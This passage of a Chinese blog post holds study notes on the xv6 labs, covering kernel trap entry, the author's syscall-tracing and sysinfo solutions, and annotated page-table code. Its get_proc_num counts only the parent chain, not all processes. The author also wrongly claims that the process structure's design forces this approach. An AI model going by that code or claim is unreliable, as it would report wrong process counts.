rw---ad</span><br><span class="line">000000008000d000 000000008000d000 0000000000004000 rw-----</span><br><span class="line">0000000080011000 0000000080011000 0000000000011000 rw---ad</span><br><span class="line">0000000080022000 0000000080022000 0000000000001000 rw-----</span><br><span class="line">0000000080023000 0000000080023000 0000000000003000 rw---ad</span><br><span class="line">0000000080026000 0000000080026000 0000000007f35000 rw-----</span><br><span class="line">0000000087f5b000 0000000087f5b000 000000000005d000 rw---ad</span><br><span class="line">0000000087fb8000 0000000087fb8000 0000000000001000 rw---a-</span><br><span class="line">0000000087fb9000 0000000087fb9000 0000000000046000 rw-----</span><br><span class="line">0000000087fff000 0000000087fff000 0000000000001000 rw---a-</span><br><span class="line">0000003ffff7f000 0000000087f77000 000000000003e000 rw-----</span><br><span class="line">0000003fffffb000 0000000087fb5000 0000000000002000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure>

<h5 id="从内核态陷入"><a href="#从内核态陷入" class="headerlink" title="从内核态陷入"></a>从内核态陷入</h5><p>书中涉及到了计数器中断的处理办法，由于我不是很熟悉计数器中断，所以暂且不讨论这种情况，在第七章中会系统的学到。我只讨论一般情况下的内核陷入。</p>
<p>内核发生陷入的话只有两种情况，一是设备中断，二是内核异常，此时是处于内核态的，<code>stvec</code>就指向了<code>kernelvec</code>,然后处理trap也是在内核态，所以不需要切换页表了。处理流程主要是两个函数：<code>kernelvec</code>-&gt;<code>kerneltrap</code>-&gt;<code>kernelvec</code></p>
<p><strong>kernelvec</strong></p>
<p>意料之中又是risc-v汇编捏，但是大概是能看懂的，kernelvec首先得把所有的寄存器存放到当前内核栈的栈上，所以首先<code>addi sp.sp,-256</code>就是<code>sp=sp+(-256)</code>，先提升栈的容量。然后把寄存器放在这256容量的栈里，<code>sd ra,0(sp)</code>等于<code>*[sp+0]=ra</code>这样的形式存储，至于为什么要存储所有的寄存器，是因为在调用<code>kerneltrap</code>的时候，会因为时钟中断而让出cpu导致丢失寄存器信息，所以得记录一下，记录完就是调用<code>kerneltrap</code>了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">        # interrupts and exceptions while in supervisor</span><br><span class="line">        # mode come here.</span><br><span class="line">        #</span><br><span class="line">        # push all registers, call kerneltrap(), restore, return.</span><br><span class="line">        #</span><br><span class="line">.globl kerneltrap</span><br><span class="line">.globl kernelvec</span><br><span class="line">.align 4</span><br><span class="line">kernelvec:</span><br><span class="line">        // make room to save registers.</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        // save the registers.</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line">        sd sp, 8(sp)</span><br><span class="line">        sd gp, 16(sp)</span><br><span class="line">        sd tp, 24(sp)</span><br><span class="line">        sd t0, 32(sp)</span><br><span class="line">        sd t1, 40(sp)</span><br><span class="line">        sd t2, 48(sp)</span><br><span class="line">        sd s0, 56(sp)</span><br><span class="line">        sd s1, 64(sp)</span><br><span class="line">        sd a0, 72(sp)</span><br><span class="line">        sd a1, 80(sp)</span><br><span class="line">        sd a2, 88(sp)</span><br><span class="line">        sd a3, 96(sp)</span><br><span class="line">        sd a4, 104(sp)</span><br><span class="line">        sd a5, 112(sp)</span><br><span class="line">        sd a6, 120(sp)</span><br><span class="line">        sd a7, 128(sp)</span><br><span class="line">        sd s2, 136(sp)</span><br><span class="line">        sd s3, 144(sp)</span><br><span class="line">        sd s4, 152(sp)</span><br><span class="line">        sd s5, 160(sp)</span><br><span class="line">        sd s6, 168(sp)</span><br><span class="line">        sd s7, 176(sp)</span><br><span class="line">        sd s8, 184(sp)</span><br><span class="line">        sd s9, 192(sp)</span><br><span class="line">        sd s10, 200(sp)</span><br><span class="line">        sd s11, 208(sp)</span><br><span class="line">        sd t3, 216(sp)</span><br><span class="line">        sd t4, 224(sp)</span><br><span class="line">        sd t5, 232(sp)</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">	// call the C trap handler in trap.c</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        // restore registers.</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        ld gp, 16(sp)</span><br><span class="line">        // not this, in case we moved CPUs: ld tp, 24(sp)</span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line">        ld t1, 40(sp)</span><br><span class="line">        ld t2, 48(sp)</span><br><span class="line">        ld s0, 56(sp)</span><br><span class="line">        ld s1, 64(sp)</span><br><span class="line">        ld a0, 72(sp)</span><br><span class="line">        ld a1, 80(sp)</span><br><span class="line">        ld a2, 88(sp)</span><br><span class="line">        ld a3, 96(sp)</span><br><span class="line">        ld a4, 104(sp)</span><br><span class="line">        ld a5, 112(sp)</span><br><span class="line">        ld a6, 120(sp)</span><br><span class="line">        ld a7, 128(sp)</span><br><span class="line">        ld s2, 136(sp)</span><br><span class="line">        ld s3, 144(sp)</span><br><span class="line">        ld s4, 152(sp)</span><br><span class="line">        ld s5, 160(sp)</span><br><span class="line">        ld s6, 168(sp)</span><br><span class="line">        ld s7, 176(sp)</span><br><span class="line">        ld s8, 184(sp)</span><br><span class="line">        ld s9, 192(sp)</span><br><span class="line">        ld s10, 200(sp)</span><br><span class="line">        ld s11, 208(sp)</span><br><span class="line">        ld t3, 216(sp)</span><br><span class="line">        ld t4, 224(sp)</span><br><span class="line">        ld t5, 232(sp)</span><br><span class="line">        ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        // return to whatever we were doing in the kernel.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p><strong>kerneltrap</strong></p>
<p>首先是储存<code>sepc</code>和<code>sstatus</code>两个寄存器，因为如果有时钟中断而调用<code>yield()</code>函数的时候会破坏他们，要使破坏了他们trap返回的时候就会出问题，保存完后真正处理trap，处理完之后恢复<code>sepc</code>和<code>sstatus</code>，然后返回到函数<code>kernelvec</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">kerneltrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 sepc = r_sepc();</span><br><span class="line">  uint64 sstatus = r_sstatus();</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get() != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((which_dev = devintr()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line">  <span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">  w_sepc(sepc);</span><br><span class="line">  w_sstatus(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回到kernelvec中就会简单了，就利用栈信息恢复通用寄存器，然后<code>addi sp, sp, 256</code>后<code>sret</code>结束内核陷入。</p>
<p>总而言之比用户态陷入要简单很多了。</p>
<h5 id="页面错误异常"><a href="#页面错误异常" class="headerlink" title="页面错误异常"></a>页面错误异常</h5><p>这个暂时不看，涉及到了第三章的知识，暂时还没有学习到。</p>
<h4 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h4><p>就是增加一个系统调用追踪的功能，可以先利用这个系统调用设置自己想要追踪的系统调用，然后这个程序以及子程序在调用这个系统调用的时候都会打印相应数据。</p>
<p>编程不是难点，难点可能是理清楚系统调用的原理以及对应的几个c文件就好了，只要阅读过书籍的第四章问题就不大的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trace_printf_sysname</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> mask=p-&gt;trace_num;</span><br><span class="line">  <span class="keyword">int</span> sys_num=p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(mask&amp;(<span class="number">1</span>&lt;&lt;sys_num))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[sys_num],p-&gt;trapframe-&gt;a0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>,&amp;mask)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;trace_num=mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h4><p>这个系统调用个就比较麻烦了，首先得把结构体从<code>struct sysinfo</code>从内核态拷贝回用户空间，然后得在内核获得空闲内存量，然后还得获得<code>stat</code>不为<code>UNUSED</code>的进程数。都没怎么听过，得阅读源码慢慢搞清楚。</p>
<p>从内核态拷贝数据使用的是<code>copyout</code>函数,之前分析过<code>copyin</code>函数，原理都是差不多的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copyout</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获得内存空闲字节课以通过阅读<code>kmalloc.c</code>源码很好的解决,在xv6系统中定义了两个结构体来管理空闲页面其中通过<code>struct run</code>组成一个单向链表来链接所有的空闲链表，然后通过<code>struct kmem.freelist</code>指向这个链表的头结点，所以只需要遍历这个链表就可以所有空闲页面了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure>

<p>在<code>struct proc</code>中有一个字段<code>struct proc *parent</code>可以通过遍历这个字段完成对进程数的统计，这种统计方式肯定有问题，因为一个进程可以有多个子进程，这个办法每一层进程只能遍历一个，与其说统计有多少个进程，不如说统计有多少层进程，当然这也是<code>struct proc</code>的设计问题，只能这样干。</p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  uint64 user_info;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(<span class="number">0</span>,&amp;user_info)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sysinfo addr get fail\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  info.freemem=countfree();</span><br><span class="line">  info.nproc=get_proc_num();</span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable,user_info,(<span class="keyword">char</span> *)&amp;info,<span class="keyword">sizeof</span>(info))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> </span></span><br><span class="line"><span class="function"><span class="title">countfree</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  r=kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;page_addr:%p\n&quot;,r);</span></span><br><span class="line">    n=n+<span class="number">4096</span>;</span><br><span class="line">    r=r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_proc_num</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(p-&gt;parent)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state!=UNUSED)&#123;</span><br><span class="line">      num++;</span><br><span class="line">    &#125;</span><br><span class="line">    p=p-&gt;parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="得分"><a href="#得分" class="headerlink" title="得分"></a>得分</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 35/35</span><br></pre></td></tr></table></figure>

<h4 id="结语-1"><a href="#结语-1" class="headerlink" title="结语"></a>结语</h4><p>对系统调用理解的更深了吧，之前只知道大概思想，现在也知道了如何实现的，也对xv6的用户态和内核态的切换更加熟悉，也更加了解了xv6的源代码。</p>
<h2 id="Lab3-page-tables"><a href="#Lab3-page-tables" class="headerlink" title="Lab3: page tables"></a>Lab3: page tables</h2><h3 id="code-read"><a href="#code-read" class="headerlink" title="code-read"></a>code-read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//walk函数在虚拟地址机制中是比较重要的函数，他有两种作用，当alloc为0的时候walk函数就是单纯的通过页表和虚拟地址找到虚拟地址对应的第三级页表对应的pte地址，当alloc为0的时候就可以通过kalloc完成对页表项和页表的增加。但不管alloc是什么值，返回的都是对应的pte地址，而不是对应的物理地址</span></span><br><span class="line"><span class="comment">//当然这一切都是依赖于虚拟地址到物理地址的直接映射，不然walk查到的页表地址直接是物理地址，在操作系统层面无法再往下查找了</span></span><br><span class="line">walk(<span class="keyword">pagetable_t</span> pagetable, uint64 va, <span class="keyword">int</span> alloc)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    panic(<span class="string">&quot;walk&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> level = <span class="number">2</span>; level &gt; <span class="number">0</span>; level--) &#123;</span><br><span class="line">    <span class="keyword">pte_t</span> *pte = &amp;pagetable[PX(level, va)];</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V) &#123;</span><br><span class="line">      pagetable = (<span class="keyword">pagetable_t</span>)PTE2PA(*pte);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span>(!alloc || (pagetable = (<span class="keyword">pde_t</span>*)kalloc()) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(pagetable) | PTE_V;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &amp;pagetable[PX(<span class="number">0</span>, va)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个函数是比较关键的设置页表，增加页表项的函数，首先通过调用walk函数得到pte的地址，然后把对应的pa填入页表项，一直重复操作直到需要映射的地址被映射完</span></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">mappages</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 va, uint64 size, uint64 pa, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 a, last;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line"></span><br><span class="line">  a = PGROUNDDOWN(va);</span><br><span class="line">  last = PGROUNDDOWN(va + size - <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">1</span>)) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*pte &amp; PTE_V)</span><br><span class="line">      panic(<span class="string">&quot;remap&quot;</span>);</span><br><span class="line">    *pte = PA2PTE(pa) | perm | PTE_V;</span><br><span class="line">    <span class="keyword">if</span>(a == last)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a += PGSIZE;</span><br><span class="line">    pa += PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对上一个函数的封装</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvmmap</span><span class="params">(uint64 va, uint64 pa, uint64 sz, <span class="keyword">int</span> perm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kvmmap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//比较重要的一个函数，主要是完成对内核页表的映射，前面的一些映射卡不懂捏，但是后面三个就是test,data以及陷阱帧的映射。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">kvminit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  kernel_pagetable = (<span class="keyword">pagetable_t</span>) kalloc();</span><br><span class="line">  <span class="built_in">memset</span>(kernel_pagetable, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// uart registers</span></span><br><span class="line">  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// virtio mmio disk interface</span></span><br><span class="line">  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CLINT</span></span><br><span class="line">  kvmmap(CLINT, CLINT, <span class="number">0x10000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PLIC</span></span><br><span class="line">  kvmmap(PLIC, PLIC, <span class="number">0x400000</span>, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel text executable and read-only.</span></span><br><span class="line">  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span></span><br><span class="line">  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// map the trampoline for trap entry/exit to</span></span><br><span class="line">  <span class="comment">// the highest virtual address in the kernel.</span></span><br><span class="line">  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>读完代码后感觉内核并不是直接运行在物理内存上的，他也遵循虚拟内存，所以要控制整个物理内存的话就需要一段虚拟地址对整个物理内存进行映射，通过这段虚拟地址控制整个物理内存。</p>
<h3 id="book-read-3"><a href="#book-read-3" class="headerlink" title="book-read"></a>book-read</h3><h4 id="创建一个地址空间"><a href="#创建一个地址空间" class="headerlink" title="创建一个地址空间"></a>创建一个地址空间</h4><p>在内核启动的时候，首先会调用main函数，main会调用上述介绍的<code>kvminit</code>来初始化内核页表，<code>kvminit</code>已经分析过了，接着看<code>kvminithart</code></p>
